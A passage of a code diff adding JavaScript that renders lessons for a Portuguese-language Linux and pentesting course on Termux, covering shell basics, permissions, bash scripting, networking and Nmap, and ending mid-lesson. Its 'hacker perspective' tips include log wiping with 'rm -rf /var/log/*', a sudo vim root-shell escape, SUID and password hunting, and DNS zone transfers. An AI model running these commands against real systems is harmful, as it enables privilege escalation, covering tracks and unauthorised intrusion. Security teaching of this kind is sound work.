+  return '<div class="lc-sec"><h2><span class="sec-n">'+String(n).padStart(2,'0')+'</span>'+t+'</h2>'+body+'</div>';
+}
+function tip(i,t,b){return'<div class="call c-tip"><span class="call-ico">'+i+'</span><div><b>'+t+'</b>'+b+'</div></div>'}
+function warn(i,t,b){return'<div class="call c-warn"><span class="call-ico">'+i+'</span><div><b>'+t+'</b>'+b+'</div></div>'}
+function danger(i,t,b){return'<div class="call c-danger"><span class="call-ico">'+i+'</span><div><b>'+t+'</b>'+b+'</div></div>'}
+function hack(b){return'<div class="call c-hack"><span class="call-ico">🎯</span><div><b>Perspectiva do Hacker</b>'+b+'</div></div>'}
+function tbl(heads,rows){
+  var h=heads.map(function(x){return'<th>'+x+'</th>'}).join('');
+  var r=rows.map(function(row){return'<tr>'+row.map(function(c){return'<td>'+c+'</td>'}).join('')+'</tr>'}).join('');
+  return'<table class="tbl"><tr>'+h+'</tr>'+r+'</table>';
+}
+function tryit(id,hint){
+  return '<div class="term"><div class="term-top"><div class="term-dots"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div></div><div class="term-lbl">⚡ Experimenta</div></div>'+
+  '<div class="term-out" id="to-'+id+'">Escreve um comando e prime Executar...</div>'+
+  '<div class="term-in"><span class="term-prompt">~/lab $</span><input class="term-input" id="ti-'+id+'" placeholder="escreve aqui..." onkeydown="if(event.key===\'Enter\')runTerm(\''+id+'\')"><button class="term-run" onclick="runTerm(\''+id+'\')">Executar</button></div>'+
+  '<div class="term-hint">Ex: '+hint+'</div></div>';
+}
+function ex(code){
+  return '<div class="ex-box"><div class="ex-title">⬡ Exercício Prático</div>'+cb('bash',code)+'</div>';
+}
+
+function buildLessonHTML(id) {
+  var builders = [bL0,bL1,bL2,bL3,bL4,bL5,bL6,bL7,bL8,bL9,bL10,bL11,bL12];
+  return builders[id]();
+}
+
+// ──── AULA 0 ────
+function bL0(){
+return '<div class="lc-eyebrow">Módulo 1 · Aula 1 de 6</div>'+
+'<h1 class="lc-h1">Terminal, Shell e como o Linux pensa</h1>'+
+'<div class="lc-intro">A maioria das pessoas abre o Termux sem saber o que acontece por baixo. Isso cria buracos que se tornam problemas sérios em segurança. Vamos construir desde o alicerce absoluto.</div>'+
+sec(1,'O que é o Terminal?',
+'<p>O <b>terminal</b> é uma interface de texto para comunicar com o sistema operativo. No Android, o Termux é o emulador de terminal. Quando abres o Termux vês:</p>'+
+cb('bash','<span class="ck">~ $</span>  <span class="cm"># o bash está à tua espera</span>',false)+
+tip('💡','Termux no Android — ','A tua pasta home fica em <code>/data/data/com.termux/files/home</code> mas o <code>~</code> aponta para lá automaticamente.')
+)+
+sec(2,'O que é o Shell?',
+'<p>O terminal é só a <b>janela</b>. O <b>Shell</b> é o programa que interpreta o que escreves e comunica com o kernel.</p>'+
+cb('fluxo','<span class="co">[Tu] → escreves → [Shell] → interpreta → [Kernel] → executa</span>',false)+
+cb('bash','<span class="ck">echo</span> <span class="cs">$SHELL</span>        <span class="cm"># qual shell estou a usar?</span>\n<span class="ck">echo</span> <span class="cs">$BASH_VERSION</span> <span class="cm"># versão do bash</span>')+
+hack(' Quando obtens shell remoto em pentest, o prompt revela o SO e privilégios. <code>#</code> = root directamente.')
+)+
+sec(3,'Anatomia do Prompt',
+cb('estrutura','<span class="ck">dawn</span><span class="co">@</span><span class="cv">termuxlab</span><span class="co">:</span><span class="cf">~/lab</span><span class="co">$</span>\n<span class="co">  │       │             │       └── $ = normal  (# = root)</span>\n<span class="co">  │       │             └── directório actual</span>\n<span class="co">  │       └── hostname da máquina</span>\n<span class="co">  └── utilizador</span>',false)+
+warn('⚠️','Root vs Normal — ','O símbolo <code>#</code> significa root — privilégios máximos. Qualquer erro pode destruir o sistema.')
+)+
+sec(4,'Filesystem Linux — tudo é uma árvore',
+'<p>No Linux existe <b>um único ponto de partida: <code>/</code></b> (raiz). Tudo está dentro desta árvore.</p>'+
+cb('árvore','<span class="ck">/</span>\n<span class="co">├── bin/</span>    <span class="cm">→ binários: ls, cp, bash</span>\n<span class="co">├── etc/</span>    <span class="cm">→ configurações: passwd, shadow</span>\n<span class="co">├── home/</span>   <span class="cm">→ pastas dos utilizadores</span>\n<span class="co">│   └── dawn/</span> <span class="cm">→ a tua pasta = ~</span>\n<span class="co">├── var/log/</span> <span class="cm">→ logs do sistema</span>\n<span class="co">└── proc/</span>   <span class="cm">→ processos em memória</span>',false)+
+hack(' Directórios mais importantes em pentest: <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/var/log/</code>, <code>/home/</code>')
+)+
+sec(5,'Os 3 comandos base de navegação',
+cb('bash','<span class="ck">pwd</span>          <span class="cm"># onde estou?</span>\n<span class="ck">ls</span>           <span class="cm"># o que há aqui?</span>\n<span class="ck">ls</span> <span class="cf">-la</span>       <span class="cm"># lista longa + ficheiros ocultos</span>\n<span class="ck">ls</span> <span class="cf">-lah</span>      <span class="cm"># + tamanhos legíveis (KB/MB)</span>\n<span class="ck">cd</span> <span class="cs">~</span>         <span class="cm"># vai para a home</span>\n<span class="ck">cd</span> <span class="cv">/</span>         <span class="cm"># vai para a raiz</span>\n<span class="ck">cd</span> <span class="cv">..</span>        <span class="cm"># sobe uma pasta</span>\n<span class="ck">cd</span> <span class="cv">-</span>         <span class="cm"># volta à pasta anterior</span>')+
+tryit('l0','pwd, ls -la, whoami, id')
+)+
+sec(6,'Atalhos de teclado',
+cb('atalhos','<span class="cf">Tab</span>      <span class="cm">→ auto-completar — usa SEMPRE</span>\n<span class="cf">Ctrl+C</span>   <span class="cm">→ interrompe o comando actual</span>\n<span class="cf">Ctrl+L</span>   <span class="cm">→ limpa o ecrã</span>\n<span class="cf">Ctrl+R</span>   <span class="cm">→ pesquisa no histórico</span>\n<span class="cf">↑ / ↓</span>   <span class="cm">→ navegar histórico</span>',false)+
+hack(' O ficheiro <code>~/.bash_history</code> é a primeira coisa que um atacante lê após comprometer um sistema. Pode conter passwords.')
+)+
+ex('<span class="ck">pwd</span>\n<span class="ck">ls</span> <span class="cf">-la</span>\n<span class="ck">whoami</span>\n<span class="ck">id</span>\n<span class="ck">echo</span> <span class="cs">$SHELL</span>\n<span class="ck">echo</span> <span class="cs">$HOME</span>\n<span class="ck">history</span>');
+}
+
+// ──── AULA 1 ────
+function bL1(){
+return '<div class="lc-eyebrow">Módulo 1 · Aula 2 de 6</div>'+
+'<h1 class="lc-h1">Criar, mover, copiar e apagar</h1>'+
+'<div class="lc-intro">Estas operações são a base de tudo — administração, scripting, hacking, automação. Um hacker que não domina o filesystem está cego.</div>'+
+sec(1,'mkdir — Criar Directórios',
+cb('bash','<span class="ck">mkdir</span> <span class="cv">projetos</span>                     <span class="cm"># cria pasta</span>\n<span class="ck">mkdir</span> <span class="cv">p1 p2 p3</span>                  <span class="cm"># cria várias</span>\n<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cv">proj/hack/tools</span>        <span class="cm"># cria toda a árvore</span>\n<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cv">lab/{recon,exploits,loot}</span> <span class="cm"># brace expansion!</span>')+
+tip('💡','O -p é essencial — ','Sem ele, se a pasta pai não existir, o comando falha. Com <code>-p</code> cria tudo o que falta.')+
+tryit('l1a','mkdir lab, mkdir -p lab/tools/nmap')
+)+
+sec(2,'touch e echo — Criar e escrever ficheiros',
+cb('bash','<span class="ck">touch</span> <span class="cv">notas.txt</span>               <span class="cm"># cria ficheiro vazio</span>\n<span class="ck">echo</span> <span class="cs">"linha 1"</span> <span class="cf">></span>  a.txt        <span class="cm"># cria/SOBRESCREVE</span>\n<span class="ck">echo</span> <span class="cs">"linha 2"</span> <span class="cf">>></span> a.txt        <span class="cm"># ADICIONA ao fim</span>\n<span class="ck">cat</span> <span class="cv">a.txt</span>                      <span class="cm"># lê o conteúdo</span>\n<span class="ck">tail</span> <span class="cf">-f</span> <span class="cv">log.txt</span>               <span class="cm"># segue em tempo real!</span>')+
+danger('⚠️','Operador > é destrutivo — ','O <code>></code> apaga o conteúdo anterior sem aviso. Usa <code>>></code> para adicionar.')
+)+
+sec(3,'cp, mv, rm — Manipular ficheiros',
+cb('bash','<span class="ck">cp</span> <span class="cv">origem.txt destino.txt</span>         <span class="cm"># copia</span>\n<span class="ck">cp</span> <span class="cf">-r</span> <span class="cv">pasta1/ pasta2/</span>            <span class="cm"># copia pasta (recursivo)</span>\n<span class="ck">mv</span> <span class="cv">antigo.txt novo.txt</span>           <span class="cm"># renomeia</span>\n<span class="ck">mv</span> <span class="cv">notas.txt</span> <span class="cs">~/lab/</span>             <span class="cm"># move</span>\n<span class="ck">rm</span> <span class="cv">ficheiro.txt</span>                  <span class="cm"># apaga</span>\n<span class="ck">rm</span> <span class="cf">-rf</span> <span class="cv">pasta/</span>                   <span class="cm"># apaga tudo ← PERIGO</span>')+
+danger('💀','Não há lixo no Linux — ','O <code>rm</code> apaga definitivamente. <code>rm -rf /</code> pode destruir o sistema inteiro.')+
+hack(' Após comprometer um sistema, hackers usam <code>rm -rf /var/log/*</code> para apagar rastros.')
+)+
+sec(4,'find — Procurar com precisão cirúrgica',
+cb('bash','<span class="ck">find</span> <span class="cv">.</span> <span class="cf">-name</span> <span class="cs">"*.txt"</span>           <span class="cm"># todos os .txt</span>\n<span class="ck">find</span> <span class="cv">/</span> <span class="cf">-type f -name</span> <span class="cs">"*.conf"</span> <span class="cm"># configs no sistema</span>\n<span class="ck">find</span> <span class="cv">/</span> <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span> <span class="cm"># SUID!</span>')+
+hack(' <code>find / -name \'*.bak\' -o -name \'*.old\' 2>/dev/null</code> encontra backups com credenciais.')
+)+
+ex('<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cs">~/lab/aula2/{textos,backups}</span>\n<span class="ck">echo</span> <span class="cs">"Ficheiro A"</span> <span class="cf">></span> <span class="cs">~/lab/aula2/textos/a.txt</span>\n<span class="ck">cat</span> <span class="cs">~/lab/aula2/textos/a.txt</span>\n<span class="ck">cp</span> <span class="cs">~/lab/aula2/textos/a.txt</span> <span class="cs">~/lab/aula2/backups/</span>\n<span class="ck">find</span> <span class="cs">~/lab/aula2/</span> <span class="cf">-name</span> <span class="cs">"*.txt"</span>');
+}
+
+// ──── AULA 2 ────
+function bL2(){
+return '<div class="lc-eyebrow">Módulo 1 · Aula 3 de 6</div>'+
+'<h1 class="lc-h1">Permissões, utilizadores e grupos</h1>'+
+'<div class="lc-intro">Permissões são o coração da segurança Linux. Quase todos os privilege escalation attacks existem porque alguém configurou permissões erradas.</div>'+
+sec(1,'Identidade no Linux',
+cb('bash','<span class="ck">whoami</span>        <span class="cm"># quem sou?</span>\n<span class="ck">id</span>            <span class="cm"># uid, gid e grupos</span>\n<span class="ck">groups</span>        <span class="cm"># grupos a que pertenço</span>\n<span class="ck">cat</span> /etc/passwd <span class="cm"># todos os utilizadores</span>')+
+tbl(['UID Range','Tipo'],[['0','root (superutilizador)'],['1–99','Utilizadores de sistema'],['1000+','Utilizadores humanos']])+
+tryit('l2a','whoami, id, groups')
+)+
+sec(2,'Ler permissões — rwx em detalhe',
+cb('estrutura','<span class="ck">-</span>  <span class="cf">rw-</span>  <span class="cv">r--</span>  <span class="cs">r--</span>\n<span class="co">│    │    │    └── Others</span>\n<span class="co">│    │    └────── Group</span>\n<span class="co">│    └─────────── User (dono)</span>\n<span class="co">└──────────────── Tipo (- ficheiro, d pasta)</span>',false)+
+tbl(['Letra','Permissão','Num pasta'],[['<code>r</code>','ler','listar (ls)'],['<code>w</code>','escrever','criar/apagar dentro'],['<code>x</code>','executar','entrar (cd)'],['<code>-</code>','sem permissão','—']])
+)+
+sec(3,'chmod — Modo Octal',
+cb('bash','<span class="cm"># r=4, w=2, x=1  →  rwx=7, rw-=6, r--=4</span>\n<span class="ck">chmod</span> <span class="cf">755</span> <span class="cv">script.sh</span>   <span class="cm"># rwxr-xr-x</span>\n<span class="ck">chmod</span> <span class="cf">644</span> <span class="cv">notas.txt</span>   <span class="cm"># rw-r--r-- (ficheiro normal)</span>\n<span class="ck">chmod</span> <span class="cf">600</span> <span class="cv">chave.pem</span>   <span class="cm"># rw------- (chave SSH!)</span>\n<span class="ck">chmod</span> <span class="cf">700</span> <span class="cv">privado.sh</span>  <span class="cm"># rwx------ (só o dono)</span>\n<span class="ck">chmod</span> <span class="cf">u+x</span> <span class="cv">script.sh</span>  <span class="cm"># simbólico: adiciona execução</span>\n<span class="ck">chmod</span> <span class="cf">o-rwx</span> <span class="cv">segredo</span>  <span class="cm"># remove tudo dos outros</span>')
+)+
+sec(4,'SUID — o vector de ataque',
+cb('bash','<span class="cm"># SUID: corre com privilégios do DONO, não de quem executa</span>\n<span class="ck">ls</span> <span class="cf">-la</span> /usr/bin/passwd\n<span class="cm"># -rwsr-xr-x ... root ... passwd</span>\n<span class="cm">#      ^ \'s\' = SUID activo</span>\n\n<span class="cm"># Encontrar todos os SUID de root:</span>\n<span class="ck">find</span> / <span class="cf">-perm -4000 -user root -type f</span> <span class="cs">2>/dev/null</span>')+
+danger('🎯','SUID = vector de ataque crítico — ','Binários SUID pertencentes a root são alvos de privilege escalation. Verifica em gtfobins.github.io.')+
+hack(' <code>sudo -l</code> é um dos primeiros comandos após acesso. <code>NOPASSWD: /usr/bin/vim</code> → <code>sudo vim -c \':!/bin/bash\'</code> = shell root.')
+)+
+ex('<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cs">~/lab/aula3/{publ,priv}</span>\n<span class="ck">echo</span> <span class="cs">"público"</span> <span class="cf">></span> <span class="cs">~/lab/aula3/publ/readme.txt</span>\n<span class="ck">chmod</span> <span class="cf">644</span> <span class="cs">~/lab/aula3/publ/readme.txt</span>\n<span class="ck">ls</span> <span class="cf">-la</span> <span class="cs">~/lab/aula3/</span>\n<span class="ck">id</span>\n<span class="ck">find</span> / <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span>');
+}
+
+// ──── AULA 3 ────
+function bL3(){
+return '<div class="lc-eyebrow">Módulo 1 · Aula 4 de 6</div>'+
+'<h1 class="lc-h1">Processos, pipes e redirecionamento</h1>'+
+'<div class="lc-intro">Processos são tudo o que corre no sistema. Pipes e redirecionamento transformam comandos simples em pipelines de análise poderosos.</div>'+
+sec(1,'Ver e controlar processos',
+cb('bash','<span class="ck">ps aux</span>                  <span class="cm"># TODOS os processos</span>\n<span class="ck">ps aux</span> | <span class="ck">grep</span> <span class="cv">apache</span>   <span class="cm"># filtra por nome</span>\n<span class="ck">ps -ef --forest</span>         <span class="cm"># árvore de processos</span>\n<span class="ck">top</span>                     <span class="cm"># monitor tempo real</span>\n<span class="ck">kill</span> <span class="cf">-9</span> <span class="cv">1234</span>           <span class="cm"># força morte do PID 1234</span>\n<span class="ck">killall</span> <span class="cv">firefox</span>        <span class="cm"># mata todos os "firefox"</span>')+
+hack(' Árvore de processos revela como um sistema foi comprometido. apache2 → bash = webshell!')+
+tryit('l3a','ps aux | wc -l')
+)+
+sec(2,'Standard Streams e Redirecionamento',
+cb('bash','<span class="cm"># stdin(0)  stdout(1)  stderr(2)</span>\n<span class="ck">ls</span> <span class="cf">-la</span> <span class="cf">></span>  output.txt          <span class="cm"># guarda stdout</span>\n<span class="ck">ls</span> <span class="cf">-la</span> <span class="cf">>></span> output.txt          <span class="cm"># guarda stdout (append)</span>\n<span class="ck">nmap</span> <span class="cv">target</span> <span class="cs">2>/dev/null</span>      <span class="cm"># descarta erros</span>\n<span class="ck">nmap</span> <span class="cv">target</span> <span class="cf">&></span> tudo.txt       <span class="cm"># stdout + stderr')+
+tip('🕳️','/dev/null — ','Buraco negro — tudo o que é enviado para lá desaparece. Usado para silenciar erros.')
+)+
+sec(3,'O Pipe | — encadear comandos',
+cb('bash','<span class="ck">ps aux</span> | <span class="ck">grep</span> <span class="cv">root</span>              <span class="cm"># processos de root</span>\n<span class="ck">ps aux</span> | <span class="ck">wc</span> <span class="cf">-l</span>                  <span class="cm"># quantos processos?</span>\n<span class="ck">cat</span> /etc/passwd | <span class="ck">cut</span> <span class="cf">-d:</span> <span class="cf">-f1</span>  <span class="cm"># extrai usernames</span>\n<span class="ck">cat</span> log | <span class="ck">awk</span> <span class="cs">\'{print $1}\'</span> | <span class="ck">sort</span> | <span class="ck">uniq</span> <span class="cf">-c</span> | <span class="ck">sort</span> <span class="cf">-rn</span> | <span class="ck">head</span> <span class="cf">-10</span>')
+)+
+sec(4,'grep, awk, sed',
+cb('bash','<span class="ck">grep</span> <span class="cf">-r</span> <span class="cs">"password"</span> /etc/       <span class="cm"># recon real!</span>\n<span class="ck">grep</span> <span class="cf">-i</span> <span class="cs">"root"</span> /etc/passwd     <span class="cm"># case-insensitive</span>\n<span class="ck">awk</span> <span class="cf">-F:</span> <span class="cs">\'{print $1,$7}\'</span> /etc/passwd <span class="cm"># user:shell</span>\n<span class="ck">sed</span> <span class="cs">\'s/antigo/novo/g\'</span> <span class="cv">f.txt</span>    <span class="cm"># substituição global</span>\n<span class="ck">sort</span> | <span class="ck">uniq</span> <span class="cf">-c</span>               <span class="cm"># conta ocorrências únicas</span>')
+)+
+ex('<span class="ck">ps aux</span> | <span class="ck">wc</span> <span class="cf">-l</span>\n<span class="ck">ps aux</span> | <span class="ck">grep</span> <span class="cs">$(whoami)</span>\n<span class="ck">cat</span> /etc/passwd | <span class="ck">cut</span> <span class="cf">-d:</span> <span class="cf">-f1</span>\n<span class="ck">find</span> / <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span> | <span class="ck">tee</span> <span class="cs">~/lab/suid.txt</span>');
+}
+
+// ──── AULA 4 ────
+function bL4(){
+return '<div class="lc-eyebrow">Módulo 1 · Aula 5 de 6</div>'+
+'<h1 class="lc-h1">Variáveis de ambiente e .bashrc</h1>'+
+'<div class="lc-intro">O ambiente do shell define a tua identidade operacional. PATH hijacking é um vector de ataque real, e .bashrc é o primeiro ficheiro que persiste após acesso.</div>'+
+sec(1,'Variáveis especiais',
+cb('bash','<span class="ck">echo</span> <span class="cs">$HOME</span>    <span class="cm"># pasta home</span>\n<span class="ck">echo</span> <span class="cs">$PATH</span>    <span class="cm"># onde o bash procura binários</span>\n<span class="ck">echo</span> <span class="cs">$USER</span>    <span class="cm"># nome do utilizador</span>\n<span class="ck">echo</span> <span class="cs">$?</span>       <span class="cm"># exit code do último comando</span>\n<span class="ck">echo</span> <span class="cs">$$</span>       <span class="cm"># PID do shell actual</span>\n<span class="ck">env</span>           <span class="cm"># TODAS as variáveis')+
+hack(' Após obter shell, <code>env</code> pode revelar <code>DB_PASS=secret</code>, IPs internos ou paths sensíveis.')+
+tryit('l4a','echo $SHELL, echo $HOME, echo $PATH')
+)+
+sec(2,'Criar e exportar variáveis',
+cb('bash','<span class="cv">NOME</span>=<span class="cs">"dawn"</span>           <span class="cm"># variável local</span>\n<span class="ck">export</span> <span class="cv">TARGET</span>=<span class="cs">"10.10.10.1"</span>\n<span class="ck">echo</span> <span class="cs">"Alvo: $TARGET"</span>   <span class="cm"># usa a variável\n<span class="ck">export</span> <span class="cv">RHOST</span>=<span class="cs">"10.10.10.5"</span>   <span class="cm"># alvo</span>\n<span class="ck">export</span> <span class="cv">LHOST</span>=<span class="cs">"10.10.14.1"</span>   <span class="cm"># a tua máquina</span>\n<span class="ck">export</span> <span class="cv">LPORT</span>=<span class="cs">"4444"</span>         <span class="cm"># porta de escuta')+
+warn('⚠️','Sem espaços no = — ','<code>VAR = valor</code> dá erro. É sempre <code>VAR=valor</code> sem espaços.')
+)+
+sec(3,'.bashrc — configuração persistente',
+cb('bash','<span class="ck">cat</span> <span class="cs">~/.bashrc</span>           <span class="cm"># ver configuração</span>\n<span class="ck">source</span> <span class="cs">~/.bashrc</span>        <span class="cm"># recarregar\n\n<span class="cm"># Conteúdo útil:</span>\n<span class="ck">alias</span> <span class="cv">ll</span>=<span class="cs">\'ls -lah\'</span>\n<span class="ck">alias</span> <span class="cv">ports</span>=<span class="cs">\'ss -tlnp\'</span>\n<span class="ck">alias</span> <span class="cv">suid</span>=<span class="cs">\'find / -perm -4000 -type f 2>/dev/null\'</span>\n<span class="ck">export</span> <span class="cv">PATH</span>=<span class="cs">"$PATH:~/tools:~/scripts"</span>')
+)+
+ex('<span class="ck">echo</span> <span class="cs">$HOME</span>\n<span class="ck">echo</span> <span class="cs">$PATH</span>\n<span class="ck">echo</span> <span class="cs">$USER</span>\n<span class="ck">echo</span> <span class="cs">$?</span>');
+}
+
+// ──── AULA 5 ────
+function bL5(){
+return '<div class="lc-eyebrow">Módulo 1 · Aula 6 de 6</div>'+
+'<h1 class="lc-h1">Bash Scripting — automação e poder</h1>'+
+'<div class="lc-intro">Scripting bash é o que separa quem usa ferramentas de quem as constrói. Scripts automatizam reconhecimento, enumeração e pós-exploração.</div>'+
+sec(1,'Estrutura base de um script',
+cb('bash','<span class="ck">#!/bin/bash</span>\n<span class="cm"># Shebang — SEMPRE na 1ª linha</span>\n\n<span class="cm"># Tornar executável:</span>\n<span class="ck">chmod</span> <span class="cf">+x</span> <span class="cv">script.sh</span>\n<span class="ck">./script.sh</span>')
+)+
+sec(2,'Variáveis e aritmética',
+cb('bash','<span class="cv">NOME</span>=<span class="cs">"TermuxLab"</span>\n<span class="cv">ARRAY</span>=<span class="cs">(item1 item2 item3)</span>\n<span class="ck">echo</span> <span class="cs">"${ARRAY[0]}"</span>     <span class="cm"># primeiro item</span>\n<span class="cv">SOMA</span>=<span class="cs">$((10 + 5 * 3))</span>\n<span class="ck">echo</span> <span class="cs">"Resultado: $SOMA"</span>')
+)+
+sec(3,'Condicionais e loops',
+cb('bash','<span class="ck">if</span> <span class="cf">[ "$USER" = "root" ]</span>; <span class="ck">then</span>\n  <span class="ck">echo</span> <span class="cs">"root!"</span>\n<span class="ck">elif</span> <span class="cf">[ $# -lt 1 ]</span>; <span class="ck">then</span>\n  <span class="ck">echo</span> <span class="cs">"Uso: $0 &lt;IP&gt;"</span>; <span class="ck">exit</span> <span class="cf">1</span>\n<span class="ck">fi</span>\n\n<span class="ck">for</span> <span class="cv">i</span> <span class="ck">in</span> <span class="cs">{1..10}</span>; <span class="ck">do</span>\n  <span class="ck">echo</span> <span class="cs">"Linha $i"</span>\n<span class="ck">done</span>')
+)+
+sec(4,'Script real — Port Scanner bash puro',
+cb('bash','<span class="ck">#!/bin/bash</span>\n<span class="ck">if</span> <span class="cf">[ $# -lt 1 ]</span>; <span class="ck">then</span> <span class="ck">echo</span> <span class="cs">"Uso: $0 &lt;IP&gt;"</span>; <span class="ck">exit</span> <span class="cf">1</span>; <span class="ck">fi</span>\n<span class="cv">TARGET</span>=<span class="cs">$1</span>\n<span class="ck">echo</span> <span class="cs">"[*] Scanning $TARGET..."</span>\n<span class="ck">for</span> <span class="cv">P</span> <span class="ck">in</span> <span class="cs">21 22 23 80 443 445 3306 3389</span>; <span class="ck">do</span>\n  <span class="co">(echo >/dev/tcp/$TARGET/$P) &>/dev/null && echo "[+] Porta $P ABERTA"</span>\n<span class="ck">done</span>')
+)+
+ex('<span class="ck">cat</span> <span class="cf">></span> <span class="cs">~/lab/scripts/hello.sh</span> << <span class="cs">\'EOF\'</span>\n#!/bin/bash\necho "=== TermuxLab ==="\necho "User: $(whoami)"\necho "Data: $(date)"\n<span class="cs">EOF</span>\n<span class="ck">chmod</span> <span class="cf">+x</span> <span class="cs">~/lab/scripts/hello.sh</span>\n<span class="ck">~/lab/scripts/hello.sh</span>');
+}
+
+// ──── AULA 6 ────
+function bL6(){
+return '<div class="lc-eyebrow">Módulo 2 · Redes</div>'+
+'<h1 class="lc-h1">Modelo OSI, TCP/IP e protocolos</h1>'+
+'<div class="lc-intro">Antes de atacar ou defender, precisas de entender como os dados viajam. O modelo OSI não é teoria abstracta — é o mapa que diz onde cada ataque actua.</div>'+
+sec(1,'Modelo OSI vs TCP/IP',
+cb('modelo','<span class="cm"># OSI — 7 camadas</span>\n<span class="co">7 Aplicação   → HTTP, DNS, FTP, SMTP, SSH</span>\n<span class="co">6 Apresentação→ TLS/SSL</span>\n<span class="co">5 Sessão      → gestão de sessões</span>\n<span class="co">4 Transporte  → TCP, UDP — PORTAS</span>\n<span class="co">3 Rede        → IP, ICMP</span>\n<span class="co">2 Ligação     → Ethernet, Wi-Fi, MAC</span>\n<span class="co">1 Física      → cabos, sinais, rádio</span>',false)+
+tbl(['Camada','Ataques típicos'],[['7 Aplicação','SQLi, XSS, Command Injection'],['4 Transporte','Port scan, SYN flood'],['3 Rede','IP spoofing, ICMP flood'],['2 Ligação','ARP poisoning, MAC flooding']])
+)+
+sec(2,'TCP 3-way Handshake',
+cb('tcp','<span class="co">Cliente                Servidor</span>\n<span class="ck">  │── SYN ────────────→ │</span>  <span class="cm">"Quero conectar"</span>\n<span class="cv">  │← SYN-ACK ────────── │</span>  <span class="cm">"OK, e eu?"</span>\n<span class="ck">  │── ACK ────────────→ │</span>  <span class="cm">"Confirmado"</span>\n<span class="co">  │══ CONEXÃO ACTIVA ══ │</span>',false)+
+hack(' Nmap SYN scan (<code>-sS</code>) envia SYN, recebe SYN-ACK mas nunca completa o handshake. Mais furtivo.')
+)+
+sec(3,'Portas mais importantes',
+cb('portas','<span class="co">22   SSH       80   HTTP      443  HTTPS</span>\n<span class="co">21   FTP       25   SMTP       53  DNS</span>\n<span class="co">445  SMB      3306  MySQL    3389  RDP</span>\n<span class="co">5432 PostgreSQL 6379 Redis  27017  MongoDB</span>',false)+
+hack(' SSH(22)→credenciais fracas. SMB(445)→EternalBlue. RDP(3389)→BlueKeep. MySQL(3306)→credenciais default.')
+)+
+ex('<span class="ck">pkg install</span> <span class="cv">iproute2 dnsutils curl</span>\n<span class="ck">ip addr show</span>\n<span class="ck">ss</span> <span class="cf">-tlnp</span>\n<span class="ck">ping</span> <span class="cf">-c 3</span> <span class="cv">8.8.8.8</span>');
+}
+
+// ──── AULA 7 ────
+function bL7(){
+return '<div class="lc-eyebrow">Módulo 2 · Redes</div>'+
+'<h1 class="lc-h1">IP, Subnetting, DNS e HTTP</h1>'+
+'<div class="lc-intro">Endereçamento IP, resolução DNS e HTTP são os três pilares da internet. DNS recon pode revelar subdomínios ocultos; entender HTTP é obrigatório para web pentesting.</div>'+
+sec(1,'IPv4 e CIDR',
+cb('rede','<span class="co">Endereços privados (RFC 1918):</span>\n<span class="cv">10.0.0.0/8</span>         <span class="cm">→ 10.x.x.x</span>\n<span class="cv">172.16.0.0/12</span>      <span class="cm">→ 172.16-31.x.x</span>\n<span class="cv">192.168.0.0/16</span>     <span class="cm">→ 192.168.x.x</span>\n\n<span class="co">CIDR:</span>\n<span class="co">/24 → 254 hosts, máscara 255.255.255.0</span>\n<span class="co">/16 → 65534 hosts</span>',false)
+)+
+sec(2,'DNS — resolução e recon',
+cb('bash','<span class="ck">nslookup</span> <span class="cv">google.com</span>\n<span class="ck">dig</span> <span class="cv">google.com</span>           <span class="cm"># lookup completo</span>\n<span class="ck">dig</span> <span class="cv">google.com MX</span>        <span class="cm"># servidores de email</span>\n<span class="ck">dig</span> <span class="cf">-x</span> <span class="cv">8.8.8.8</span>           <span class="cm"># reverse lookup</span>')+
+hack(' Zone transfer: <code>dig axfr @ns1.domain.com domain.com</code> — se mal configurado, revela TODOS os hosts.')
+)+
+sec(3,'HTTP com curl',
+cb('bash','<span class="ck">curl</span> <span class="cf">-I</span> <span class="cv">https://site.com</span>           <span class="cm"># só cabeçalhos</span>\n<span class="ck">curl</span> <span class="cf">-v</span> <span class="cv">https://site.com</span>           <span class="cm"># verbose completo</span>\n<span class="ck">curl</span> <span class="cf">-X POST -d</span> <span class="cs">\'user=a&pass=b\'</span> <span class="cv">URL</span>\n<span class="ck">curl</span> <span class="cf">-k</span> <span class="cv">https://self-signed.site</span>   <span class="cm"># ignora cert inválido</span>')+
+hack(' <code>curl -I</code> revela <code>Server: Apache/2.4.52</code> e <code>X-Powered-By: PHP/7.4</code> — verifica no CVE database.')
+)+
+ex('<span class="ck">ip addr show</span>\n<span class="ck">ip route show</span>\n<span class="ck">cat</span> /etc/resolv.conf');
+}
+
+// ──── AULA 8 ────
+function bL8(){
+return '<div class="lc-eyebrow">Módulo 2 · Redes</div>'+
+'<h1 class="lc-h1">Nmap — reconhecimento de redes</h1>'+
+'<div class="lc-intro">Nmap é a ferramenta de reconhecimento de redes mais usada no mundo. O alvo de prática oficial é scanme.nmap.org — podes escanear legalmente.</div>'+
+danger('⚖️','Só scan em alvos autorizados — ','Usar Nmap sem permissão é ilegal. Usa scanme.nmap.org, a tua rede, ou HackTheBox/TryHackMe.')+
+sec(1,'Tipos de scan',
+cb('bash','<span class="ck">nmap</span> <span class="cf">-sS</span> <span class="cv">target</span>  <span class="cm"># SYN scan (stealth) ← mais usado</span>\n<span class="ck">nmap</span> <span class="cf">-sT</span> <span class="cv">target</span>  <span class="cm"># TCP connect (sem root)</span>\n<span class="ck">nmap</span> <span class="cf">-sU</span> <span class="cv">target</span>  <span class="cm"># UDP scan</span>\n<span class="ck">nmap</span> <span class="cf">-sn</span> <span class="cv">target</span>  <span class="cm"># ping scan (hosts vivos)</span>')
+)+
+sec(2,'Portas e versões',
